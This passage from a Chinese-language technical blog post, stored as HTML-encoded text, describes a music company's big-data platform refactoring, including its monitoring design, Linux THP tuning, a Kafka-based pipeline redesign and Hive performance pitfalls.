&#x65F6;&#x63D0;&#x6570;&#x3001;&#x6570;&#x636E;&#x8D28;&#x91CF;&#x6821;&#x9A8C;&#x7B49;&#x751F;&#x4EA7;&#x7684;&#x4E34;&#x65F6;&#x6570;&#x636E;&#x3002;</p>\n<p>&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#xFF1A;&#x57FA;&#x4E8E;Storm/JStorm&#xFF0C;Drools,Esper&#x3002;&#x4E3B;&#x8981;&#x5E94;&#x7528;&#x4E8E;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x3001;APM&#x3001;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;&#x5E73;&#x53F0;&#x3001;&#x5B9E;&#x65F6;DAU&#x7EDF;&#x8BA1;&#x7B49;&#x3002;</p>\n<p>HBase/MySQL&#xFF1A;&#x7528;&#x4E8E;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#xFF0C;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;&#x7ED3;&#x679C;&#x5B58;&#x50A8;&#x670D;&#x52A1;&#x3002;</p>\n<p>Redis&#xFF1A;&#x7528;&#x4E8E;&#x4E2D;&#x95F4;&#x8BA1;&#x7B97;&#x7ED3;&#x679C;&#x5B58;&#x50A8;&#x6216;&#x5B57;&#x5178;&#x6570;&#x636E;&#x7B49;&#x3002;</p>\n<p>Elasticsearch&#xFF1A;&#x7528;&#x4E8E;&#x660E;&#x7EC6;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x67E5;&#x8BE2;&#x53CA;HBase&#x7684;&#x4E8C;&#x7EA7;&#x7D22;&#x5F15;&#x5B58;&#x50A8;(&#x8FD9;&#x5757;&#x76EE;&#x524D;&#x5728;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x8FD8;&#x6CA1;&#x6709;&#x5927;&#x89C4;&#x6A21;&#x4F7F;&#x7528;&#xFF0C;&#x6709;&#x5174;&#x8DA3;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x4EE5;&#x52A0;&#x5165;&#x6211;&#x4EEC;&#x4E00;&#x8D77;&#x73A9;ES)&#x3002;</p>\n<p>Druid&#xFF1A;&#x76EE;&#x524D;&#x7528;&#x4E8E;&#x652F;&#x6301;&#x5927;&#x6570;&#x636E;&#x96C6;&#x7684;&#x5FEB;&#x901F;&#x5373;&#x5E2D;&#x67E5;&#x8BE2;(ad-hoc)&#x3002;</p>\n<p>&#x6570;&#x636E;&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#xFF1A;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x5305;&#x62EC;&#x57FA;&#x7840;&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x4E0E;&#x6570;&#x636E;&#x8D28;&#x91CF;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#xFF0C;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x5206;&#x4E3A;2&#x5927;&#x65B9;&#x5411;&#xFF0C;&#x5B8F;&#x89C2;&#x5C42;&#x9762;&#x548C;&#x5FAE;&#x89C2;&#x5C42;&#x9762;&#x3002;&#x5B8F;&#x89C2;&#x89D2;&#x5EA6;&#x7684;&#x7406;&#x89E3;&#x5C31;&#x662F;&#x8FDB;&#x7A0B;&#x7EA7;&#x522B;,&#x62D3;&#x6251;&#x7ED3;&#x6784;&#x7EA7;&#x522B;,&#x62FF;Hadoop&#x4E3E;&#x4F8B;&#xFF0C;&#x5982;&#xFF1A;DataNode&#xFF0C;NameNode&#xFF0C;JournalNode&#xFF0C;ResourceManager&#xFF0C;NodeManager&#xFF0C;&#x4E3B;&#x8981;&#x5C31;&#x662F;&#x8FD9;5&#x5927;&#x7EC4;&#x4EF6;&#xFF0C;&#x901A;&#x8FC7;&#x5206;&#x6790;&#x8FD9;&#x4E9B;&#x8282;&#x70B9;&#x4E0A;&#x7684;&#x76D1;&#x63A7;&#x6570;&#x636E;&#xFF0C;&#x4E00;&#x822C;&#x4F60;&#x80FD;&#x591F;&#x5B9A;&#x4F4D;&#x5230;&#x6162;&#x8282;&#x70B9;&#xFF0C;&#x53EF;&#x80FD;&#x67D0;&#x53F0;&#x673A;&#x5668;&#x7684;&#x7F51;&#x7EDC;&#x51FA;&#x95EE;&#x9898;&#x4E86;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#x67D0;&#x53F0;&#x673A;&#x5668;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;&#x603B;&#x662F;&#x5927;&#x4E8E;&#x6B63;&#x5E38;&#x673A;&#x5668;&#x7B49;&#x7B49;&#x8FD9;&#x6837;&#x7C7B;&#x4F3C;&#x7684;&#x95EE;&#x9898;&#x3002;&#x521A;&#x521A;&#x8BF4;&#x7684;&#x53E6;&#x4E00;&#x4E2A;&#x76D1;&#x63A7;&#x65B9;&#x5411;&#xFF0C;&#x5C31;&#x662F;&#x5FAE;&#x89C2;&#x5C42;&#x9762;&#xFF0C;&#x5C31;&#x662F;&#x7EC6;&#x7C92;&#x5EA6;&#x5316;&#x7684;&#x76D1;&#x63A7;&#xFF0C;&#x57FA;&#x4E8E;user&#x7528;&#x6237;&#x7EA7;&#x522B;&#xFF0C;&#x57FA;&#x4E8E;&#x5355;&#x4E2A;job&#xFF0C;&#x5355;&#x4E2A;task&#x7EA7;&#x522B;&#x7684;&#x76D1;&#x63A7;&#xFF0C;&#x50CF;&#x8FD9;&#x7C7B;&#x76D1;&#x63A7;&#x6307;&#x6807;&#x5C31;&#x662F;&#x53E6;&#x4E00;&#x5927;&#x65B9;&#x5411;&#xFF0C;&#x8FD9;&#x7C7B;&#x7684;&#x76D1;&#x63A7;&#x6307;&#x6807;&#x5728;&#x5B9E;&#x9645;&#x7684;&#x4F7F;&#x7528;&#x573A;&#x666F;&#x4E2D;&#x7279;&#x522B;&#x91CD;&#x8981;&#xFF0C;&#x4E00;&#x65E6;&#x4F60;&#x7684;&#x96C6;&#x7FA4;&#x8D44;&#x6E90;&#x662F;&#x5F00;&#x653E;&#x7ED9;&#x5916;&#x9762;&#x7684;&#x7528;&#x6237;&#x4F7F;&#x7528;&#xFF0C;&#x7528;&#x6237;&#x672C;&#x8EAB;&#x4E0D;&#x4E86;&#x89E3;&#x4F60;&#x7684;&#x8FD9;&#x5957;&#x673A;&#x5236;&#x539F;&#x7406;&#xFF0C;&#x5F88;&#x5BB9;&#x6613;&#x4F1A;&#x4E71;&#x7533;&#x8BF7;&#x8D44;&#x6E90;&#xFF0C;&#x9020;&#x6210;&#x4E25;&#x91CD;&#x62D6;&#x57AE;&#x96C6;&#x7FA4;&#x6574;&#x4F53;&#x8FD0;&#x4F5C;&#x6548;&#x7387;&#x7684;&#x4E8B;&#x60C5;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x7C7B;&#x76D1;&#x63A7;&#x7684;&#x6307;&#x6807;&#x5C31;&#x662F;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x8FD9;&#x6837;&#x7684;&#x4E8B;&#x60C5;&#x53D1;&#x751F;&#x3002;&#x76EE;&#x524D;&#x6211;&#x4EEC;&#x4E3B;&#x8981;&#x5B9E;&#x73B0;&#x4E86;&#x5B8F;&#x89C2;&#x5C42;&#x9762;&#x7684;&#x76D1;&#x63A7;&#x3002;&#x5982;&#xFF1A;&#x6570;&#x636E;&#x8D28;&#x91CF;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x5B9E;&#x73B0;&#x65B9;&#x6848;&#x5982;&#x4E0B;:</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/8.jpg\" alt=\"&#x6570;&#x636E;&#x5E73;&#x53F0;&#x76D1;&#x63A7;\"></p>\n<h2 id=\"&#x4E09;&#x3001;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x8FC7;&#x7A0B;&#x4E2D;&#x8E29;&#x8FC7;&#x7684;&#x5751;\"><a href=\"#&#x4E09;&#x3001;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x8FC7;&#x7A0B;&#x4E2D;&#x8E29;&#x8FC7;&#x7684;&#x5751;\" class=\"headerlink\" title=\"&#x4E09;&#x3001;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x8FC7;&#x7A0B;&#x4E2D;&#x8E29;&#x8FC7;&#x7684;&#x5751;\"></a>&#x4E09;&#x3001;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x8FC7;&#x7A0B;&#x4E2D;&#x8E29;&#x8FC7;&#x7684;&#x5751;</h2><p>&#x6211;&#x4EEC;&#x5728;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x8FC7;&#x7A0B;&#x4E2D;&#x8E29;&#x8FC7;&#x7684;&#x5751;&#xFF0C;&#x5927;&#x81F4;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x3001;&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x3001;&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x4E09;&#x7C7B;&#xFF0C;&#x4E0B;&#x9762;&#x4E3B;&#x8981;&#x5217;&#x4E3E;&#x4E9B;&#x6BD4;&#x8F83;&#x5178;&#x578B;&#x7684;&#xFF0C;&#x82B1;&#x65F6;&#x95F4;&#x6BD4;&#x8F83;&#x957F;&#x7684;&#x95EE;&#x9898;&#x3002;</p>\n<h3 id=\"1-&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7EA7;&#x7684;&#x5751;\"><a href=\"#1-&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7EA7;&#x7684;&#x5751;\" class=\"headerlink\" title=\"1. &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7EA7;&#x7684;&#x5751;\"></a>1. &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7EA7;&#x7684;&#x5751;</h3><p>Hadoop&#x7684;I/O&#x6027;&#x80FD;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x4F9D;&#x8D56;&#x4E8E;Linux&#x672C;&#x5730;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;&#x8BFB;&#x5199;&#x6027;&#x80FD;&#x3002;Linux&#x4E2D;&#x6709;&#x591A;&#x79CD;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x53EF;&#x4F9B;&#x9009;&#x62E9;&#xFF0C;&#x6BD4;&#x5982;ext3&#x548C;ext4&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x5DEE;&#x522B;&#x3002;&#x6211;&#x4EEC;&#x4E3B;&#x8981;&#x60F3;&#x5229;&#x7528;ext4&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;&#x7279;&#x6027;&#xFF0C;&#x7531;&#x4E8E;&#x4E4B;&#x524D;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x90FD;&#x662F;CentOS5.9&#x4E0D;&#x652F;&#x6301;ext4&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#xFF0C;&#x6240;&#x4EE5;&#x8003;&#x8651;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5347;&#x7EA7;&#x4E3A;CentOS6.3&#x7248;&#x672C;&#xFF0C;&#x90E8;&#x7F72;Hadoop&#x96C6;&#x7FA4;&#x540E;&#xFF0C;&#x4F5C;&#x4E1A;&#x4E00;&#x542F;&#x52A8;&#xFF0C;&#x5C31;&#x51FA;&#x73B0;CPU&#x5185;&#x6838;&#x8FC7;&#x9AD8;&#x7684;&#x95EE;&#x9898;&#x3002;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/9.jpg\" alt=\"hodoop&#x96C6;&#x7FA4;&#xFF0C;CPU&#x8FC7;&#x9AD8;\"></p>\n<p>&#x7ECF;&#x8FC7;&#x5F88;&#x957F;&#x65F6;&#x95F4;&#x7684;&#x6D4B;&#x8BD5;&#x9A8C;&#x8BC1;&#xFF0C;&#x53D1;&#x73B0;CentOS6&#x4F18;&#x5316;&#x4E86;&#x5185;&#x5B58;&#x7533;&#x8BF7;&#x7684;&#x6548;&#x7387;&#xFF0C;&#x5F15;&#x5165;&#x4E86;THP&#x7684;&#x7279;&#x6027;&#xFF0C;&#x800C;Hadoop&#x662F;&#x9AD8;&#x5BC6;&#x96C6;&#x578B;&#x5185;&#x5B58;&#x8FD0;&#x7B97;&#x7CFB;&#x7EDF;&#xFF0C;&#x8FD9;&#x4E2A;&#x6539;&#x52A8;&#x7ED9;hadoop&#x5E26;&#x6765;&#x4E86;&#x526F;&#x4F5C;&#x7528;&#x3002;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x5185;&#x6838;&#x53C2;&#x6570;&#x4F18;&#x5316;&#x5173;&#x95ED;&#x7CFB;&#x7EDF;THP&#x7279;&#x6027;&#xFF0C;CPU&#x5185;&#x6838;&#x4F7F;&#x7528;&#x7387;&#x9A6C;&#x4E0A;&#x4E0B;&#x964D;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;:<br>echo never &gt; /sys/kernel/mm/redhat_transparent_hugepage/enabled<br>echo never &gt; /sys/kernel/mm/redhat_transparent_hugepage/defrag</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/10.jpg\" alt=\"THP&#x7684;&#x597D;&#x5904;\"></p>\n<h3 id=\"2-&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x7684;&#x5751;\"><a href=\"#2-&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x7684;&#x5751;\" class=\"headerlink\" title=\"2.&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x7684;&#x5751;\"></a>2.&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x7684;&#x5751;</h3><p>&#x6700;&#x521D;&#x7684;&#x6570;&#x636E;&#x6D41;&#x67B6;&#x6784;&#x662F;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x7F51;&#x5173;&#x628A;&#x6570;&#x636E;&#x4E0A;&#x62A5;&#x7ED9;Kafka&#xFF0C;&#x518D;&#x7531;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;&#x5E73;&#x53F0;(ETL)&#x505A;&#x9884;&#x5904;&#x7406;&#x540E;&#x76F4;&#x63A5;&#x5B9E;&#x65F6;&#x5199;&#x5165;HDFS&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/11.jpg\" alt=\"HDFS\"></p>\n<p>&#x6B64;&#x67B6;&#x6784;&#xFF0C;&#x9700;&#x8981;&#x7EF4;&#x6301;HDFS Client&#x7684;&#x957F;&#x8FDE;&#x63A5;&#xFF0C;&#x7531;&#x4E8E;&#x7F51;&#x7EDC;&#x7B49;&#x5404;&#x79CD;&#x539F;&#x56E0;&#x5BFC;&#x81F4;Storm&#x5B9E;&#x65F6;&#x5199;&#x5165;HDFS&#x7ECF;&#x5E38;&#x4E0D;&#x7A33;&#x5B9A;&#xFF0C;&#x9694;&#x4E09;&#x5DEE;&#x4E94;&#x7684;&#x51FA;&#x73B0;&#x6570;&#x636E;&#x5F02;&#x5E38;&#xFF0C;&#x4F7F;&#x540E;&#x9762;&#x7684;&#x8BA1;&#x7B97;&#x7ED3;&#x679C;&#x5F02;&#x5E38;&#x4E0D;&#x65AD;&#xFF0C;&#x5F53;&#x65F6;&#x5C1D;&#x8BD5;&#x8FC7;&#x5F88;&#x591A;&#x79CD;&#x624B;&#x6BB5;&#x53BB;&#x4F18;&#x5316;&#xFF0C;&#x5982;&#xFF1A;&#x4FDD;&#x8BC1;&#x957F;&#x8FDE;&#x63A5;&#x3001;&#x8FDE;&#x63A5;&#x65AD;&#x540E;&#x91CD;&#x8BD5;&#x673A;&#x5236;&#x3001;&#x8C03;&#x6574;HDFS&#x670D;&#x52A1;&#x7AEF;&#x53C2;&#x6570;&#x7B49;&#xFF0C;&#x90FD;&#x89E3;&#x51B3;&#x7684;&#x4E0D;&#x662F;&#x5F7B;&#x5E95;&#x3002;<br>&#x6BCF;&#x5929;&#x5F02;&#x5E38;&#x4E0D;&#x65AD;&#xFF0C;&#x65E7;&#x5F02;&#x5E38;&#x6CA1;&#x89E3;&#x51B3;&#xFF0C;&#x65B0;&#x5F02;&#x5E38;&#x53C8;&#x6765;&#x4E86;&#xFF0C;&#x5728;&#x538B;&#x529B;&#x5C71;&#x5927;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8003;&#x8651;&#x4ECE;&#x67B6;&#x6784;&#x89D2;&#x5EA6;&#x8C03;&#x6574;&#xFF0C;&#x4E0D;&#x80FD;&#x53EA;&#x4ECE;&#x5177;&#x4F53;&#x7684;&#x6280;&#x672F;&#x70B9;&#x53BB;&#x4F18;&#x5316;&#x4E86;&#xFF0C;&#x5728;&#x505A;&#x67B6;&#x6784;&#x8C03;&#x6574;&#x65F6;&#xFF0C;&#x8003;&#x8651;&#x5230;&#x6211;&#x4EEC;&#x67B6;&#x6784;&#x91CD;&#x6784;&#x7684;&#x521D;&#x8877;&#xFF0C;&#x63D0;&#x9AD8;&#x6570;&#x636E;&#x7684;&#x5B9E;&#x65F6;&#x6027;&#xFF0C;&#x5C3D;&#x91CF;&#x8BA9;&#x8BA1;&#x7B97;&#x4EFB;&#x52A1;&#x5B9E;&#x65F6;&#x5316;&#xFF0C;&#x4F46;&#x91CD;&#x6784;&#x8FC7;&#x7A0B;&#x4E2D;&#x8981;&#x8003;&#x8651;&#x73B0;&#x6709;&#x4E1A;&#x52A1;&#x7684;&#x8FC7;&#x6E21;&#xFF0C;&#x6240;&#x4EE5;&#x67B6;&#x6784;&#x5FC5;&#x987B;&#x652F;&#x6301;&#x5B9E;&#x65F6;&#x4E0E;&#x79BB;&#x7EBF;&#x7684;&#x9700;&#x6C42;&#xFF0C;&#x7ED3;&#x5408;&#x8FD9;&#x4E9B;&#x9700;&#x6C42;&#xFF0C;&#x5728;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;&#x5E73;&#x53F0;(ETL)&#x540E;&#x52A0;&#x4E86;&#x4E00;&#x5C42;&#x6570;&#x636E;&#x7F13;&#x5B58;&#x91CD;&#x7528;&#x5C42;(kafka)&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7ECF;&#x8FC7;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;&#x5E73;&#x53F0;&#x540E;&#x7684;&#x6570;&#x636E;&#x8FD8;&#x662F;&#x5199;&#x5165;kafka&#x96C6;&#x7FA4;&#xFF0C;&#x7531;&#x4E8E;kafka&#x652F;&#x6301;&#x91CD;&#x590D;&#x6D88;&#x8D39;&#xFF0C;&#x6240;&#x4EE5;&#x540C;&#x4E00;&#x4EFD;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x65E2;&#x6EE1;&#x8DB3;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x4E5F;&#x6EE1;&#x8DB3;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;&#xFF0C;&#x4ECE;&#x4E0A;&#x9762;&#x7684;&#x6574;&#x4F53;&#x6280;&#x672F;&#x67B6;&#x6784;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/12.jpg\" alt=\"kafka\"></p>\n<p>KG-Camus&#x7EC4;&#x4EF6;&#x4E5F;&#x662F;&#x57FA;&#x4E8E;&#x67B6;&#x6784;&#x8C03;&#x6574;&#x540E;&#xFF0C;&#x91CD;&#x65B0;&#x5B9E;&#x73B0;&#x4E86;&#x4E00;&#x5957;&#x79BB;&#x7EBF;&#x6D88;&#x8D39;Kafka&#x96C6;&#x7FA4;&#x6570;&#x636E;&#x7684;&#x7EC4;&#x4EF6;&#xFF0C;&#x6B64;&#x7EC4;&#x4EF6;&#x662F;&#x53C2;&#x8003;LinkedIn&#x7684;Camus&#x5B9E;&#x73B0;&#x7684;&#x3002;&#x6B64;&#x65B9;&#x5F0F;&#xFF0C;&#x4F7F;&#x6570;&#x636E;&#x6D88;&#x8D39;&#x6A21;&#x5F0F;&#x7531;&#x539F;&#x6765;&#x7684;&#x63A8;&#x65B9;&#x5F0F;&#x6539;&#x4E3A;&#x62C9;&#x6A21;&#x5F0F;&#x4E86;&#xFF0C;&#x4E0D;&#x7528;&#x7EF4;&#x6301;HDFS Client&#x7684;&#x957F;&#x8FDE;&#x63A5;&#x7B49;&#x529F;&#x80FD;&#x4E86;&#xFF0C;&#x76F4;&#x63A5;&#x7531;&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#x7CFB;&#x7EDF;&#x6BCF;&#x9694;&#x65F6;&#x95F4;&#x53BB;&#x62C9;&#x4E00;&#x6B21;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x4E1A;&#x52A1;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#xFF0C;&#x4ECE;&#x6B64;&#x67B6;&#x6784;&#x8C03;&#x6574;&#x4E0A;&#x7EBF;&#x540E;&#xFF0C;&#x57FA;&#x672C;&#x6CA1;&#x6709;&#x7C7B;&#x4F3C;&#x7684;&#x5F02;&#x5E38;&#x51FA;&#x73B0;&#x4E86;&#x3002;<br>&#x8FD9;&#x4E2A;&#x5751;&#xFF0C;&#x662F;&#x6211;&#x81EA;&#x5DF1;&#x7ED9;&#x81EA;&#x5DF1;&#x6316;&#x7684;&#xFF0C;&#x5BFC;&#x81F4;&#x6211;&#x4EEC;&#x7684;&#x91CD;&#x6784;&#x8BA1;&#x5212;&#x5EF6;&#x671F;2&#x4E2A;&#x6708;&#xFF0C;&#x4E3B;&#x8981;&#x539F;&#x56E0;&#x662F;&#x7531;&#x6700;&#x521D;&#x6280;&#x672F;&#x9884;&#x7814;&#x7A76;&#x6D4B;&#x8BD5;&#x4E0D;&#x5145;&#x5206;&#x6240;&#x5BFC;&#x81F4;&#x3002;</p>\n<h3 id=\"3-&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x7684;&#x5751;\"><a href=\"#3-&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x7684;&#x5751;\" class=\"headerlink\" title=\"3.&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x7684;&#x5751;\"></a>3.&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x7684;&#x5751;</h3><p>&#x7531;&#x4E8E;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x6D89;&#x53CA;&#x5230;&#x7684;&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x5F88;&#x591A;&#xFF0C;&#x8E29;&#x8FC7;&#x7684;&#x5751;&#x4E5F;&#x662F;&#x5341;&#x4E2A;&#x624B;&#x6307;&#x6570;&#x4E0D;&#x8FC7;&#x6765;&#x3002;</p>\n<p>(1)&#x3001;&#x5F53;&#x6211;&#x4EEC;&#x7684;&#x884C;&#x4E3A;&#x6570;&#x636E;&#x5168;&#x91CF;&#x63A5;&#x5165;&#x5230;Kafka&#x96C6;&#x7FA4;(&#x51E0;&#x767E;&#x4EBF;/&#x5929;)&#xFF0C;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x7F51;&#x5361;&#x51FA;&#x73B0;&#x5927;&#x91CF;&#x8FDE;&#x63A5;&#x8D85;&#x65F6;&#x73B0;&#x8C61;&#xFF0C;&#x4F46;&#x4E07;&#x5146;&#x7F51;&#x5361;&#x8FDB;&#x51FA;&#x6D41;&#x91CF;&#x4F7F;&#x7528;&#x7387;&#x5E76;&#x4E0D;&#x662F;&#x5F88;&#x9AD8;&#xFF0C;&#x53EA;&#x6709;&#x51E0;&#x767E;Mbit/s&#xFF0C;&#x7ECF;&#x8FC7;&#x5927;&#x91CF;&#x7684;&#x6D4B;&#x8BD5;&#x6392;&#x67E5;&#x540E;&#xFF0C;&#x8C03;&#x6574;&#x4EE5;&#x4E0B;&#x53C2;&#x6570;&#xFF0C;&#x5C31;&#x662F;&#x987A;&#x5229;&#x89E3;&#x51B3;&#x4E86;&#x6B64;&#x95EE;&#x9898;&#x3002;&#x8C03;&#x6574;&#x53C2;&#x6570;&#x540E;&#x7F51;&#x5361;&#x6D41;&#x91CF;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;</p>\n<p>a)&#x3001;num.network.threads(&#x7F51;&#x7EDC;&#x5904;&#x7406;&#x7EBF;&#x7A0B;&#x6570;)&#x503C;&#x5E94;&#x8BE5;&#x6BD4;cpu&#x6570;&#x7565;&#x5927;<br>b)&#x3001;num.io.threads(&#x63A5;&#x6536;&#x7F51;&#x7EDC;&#x7EBF;&#x7A0B;&#x8BF7;&#x6C42;&#x5E76;&#x5904;&#x7406;&#x7EBF;&#x7A0B;&#x6570;)&#x503C;&#x63D0;&#x9AD8;&#x4E3A;cpu&#x6570;&#x4E24;&#x500D;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/13.jpg\" alt=\"&#x8FDE;&#x63A5;&#x8D85;&#x65F6;\"><br>(2)&#x3001;&#x5728;hive0.14 &#x7248;&#x672C;&#x4E2D;&#xFF0C;&#x5229;&#x7528;&#x51FD;&#x6570;ROW_NUMBER OVER&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x5904;&#x7406;&#x540E;&#xFF0C;&#x5BFC;&#x81F4;&#x5927;&#x91CF;&#x7684;&#x4F5C;&#x4E1A;&#x51FA;&#x73B0;&#x5EF6;&#x65F6;&#x5F88;&#x5927;&#x7684;&#x73B0;&#x8C61;&#xFF0C;&#x7ECF;&#x5F02;&#x5E38;&#x6392;&#x67E5;&#x540E;&#xFF0C;&#x53D1;&#x73B0;&#x5728;&#x6570;&#x636E;&#x8BB0;&#x5F55;&#x6570;&#x6CA1;&#x53D8;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x6570;&#x636E;&#x7684;&#x5B58;&#x50A8;&#x5BB9;&#x91CF;&#x6269;&#x5927;&#x5230;&#x539F;&#x6765;&#x7684;5&#x500D;&#x5DE6;&#x53F3;&#xFF0C;&#x5BFC;&#x81F4;MapReduce&#x6267;&#x884C;&#x5F88;&#x6162;&#x9020;&#x6210;&#x7684;&#x3002;&#x6539;&#x4E3A;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#x7C7B;&#x4F3C;&#x7684;&#x51FD;&#x6570;&#x540E;&#xFF0C;&#x89E3;&#x51B3;&#x4E86;&#x5BB9;&#x91CF;&#x6269;&#x5927;&#x4E3A;&#x539F;&#x6765;&#x51E0;&#x500D;&#x7684;&#x73B0;&#x8C61;&#x3002;&#x8BF4;&#x5230;&#x8FD9;&#x91CC;&#xFF0C;&#x4E5F;&#x5728;&#x6B64;&#x8BF7;&#x6559;&#x8BFB;&#x5230;&#x6B64;&#x5904;&#x7684;&#x8BFB;&#x8005;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5728;&#x6D77;&#x91CF;&#x6570;&#x636E;&#x53BB;&#x91CD;&#x4E2D;&#x91C7;&#x7528;&#x4EC0;&#x4E48;&#x7B97;&#x6CD5;&#x6216;&#x7EC4;&#x4EF6;&#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#x5408;&#x9002;&#xFF0C;&#x65E2;&#x80FD;&#x9AD8;&#x6027;&#x80FD;&#x53C8;&#x80FD;&#x9AD8;&#x51C6;&#x786E;&#x6027;&#xFF0C;&#x6709;&#x597D;&#x7684;&#x5EFA;&#x8BAE;&#x6216;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x53EF;&#x4EE5;&#x52A0;happyjim2010&#x5FAE;&#x4FE1;&#x79C1;